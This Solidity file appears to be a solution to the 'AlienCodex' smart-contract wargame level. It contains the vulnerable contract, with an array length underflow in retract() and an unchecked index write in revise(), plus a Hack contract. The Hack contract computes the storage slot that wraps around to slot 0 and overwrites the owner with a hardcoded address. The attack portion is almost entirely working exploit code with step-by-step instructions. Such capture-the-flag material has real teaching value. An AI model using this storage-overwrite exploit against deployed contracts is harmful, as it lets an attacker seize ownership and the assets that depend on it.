// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted returns (uint256) {
        codex.length--;
        // return codex.length;
        // Underflow will result in 115792089237316195423570985008687907853269984665640564039457584007913129639935
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }

    // !!!!!! I added a few helper functions to fully understand where the array will start at and which length we can achieve with underflowing !!!!!! //

    // function hashOfArrayStorageSlot() external view returns(uint256) {
    // example 32bytes value:
    // 0x7465737400000000000000000000000000000000000000000000000000000000
    // 0x000000000000000000000000e4064d8E292DCD971514972415664765e51B5364
    //  uint256 slot = uint256(1);
    //  return uint256(keccak256(abi.encodePacked(slot)));

    // Keccak256 of Slot 1 will be the beginning of the array + the value of Slot 2 will be the length
    // 0th slot = owner (20bytes) + bool (1byte) packed
    // Storage slot our array will beginn at
    // 80084422859880547211683076133703299733277748156566366325829078699459944778998
    // }
}

contract Hack {
    // So we retrieved the storage slot we will start at which is the keccak256 of the storrage slot (1) =>
    // 80084422859880547211683076133703299733277748156566366325829078699459944778998
    // and the following is the Max of a uint256
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935
    // so we need to write to that storage slot + 1 to land on the 0th storage slot where "owner" is stored
    // to cause an overflow on the storage we can change the owner which is stored and packed together with the
    // "contact" boolean we could theoretically achieve that by writing to the
    // (115792089237316195423570985008687907853269984665640564039457584007913129639935 + 1)
    // - 80084422859880547211683076133703299733277748156566366325829078699459944778998 = x
    // => x = 35707666377435648211887908874984608119992236509074197713628505308453184860938 th slot
    // and put in our address padded to 32 bytes + the slot into the revise function

    // Step 1: call make_contact()
    // Step 2: call retract()
    // Step 3: call revise with the calculated slot x from above and your address padded with zeros to the left to 32 bytes
    AlienCodex public target;
    uint256 constant ATTACK_NUMBER =
        35707666377435648211887908874984608119992236509074197713628505308453184860938;
    bytes32 constant MY_ADDRESS_PADDED =
        0x000000000000000000000000e4064d8E292DCD971514972415664765e51B5364;

    constructor(address _alienCodex) public {
        target = AlienCodex(_alienCodex);
        target.make_contact(); // set boolean to be able to interact with contract
        target.retract(); // make it underflow
    }

    // Now revise the ATTACK_NUMBER th slot and put in the address padded with zeros
    function attack() external {
        target.revise(ATTACK_NUMBER, MY_ADDRESS_PADDED);
    }
}
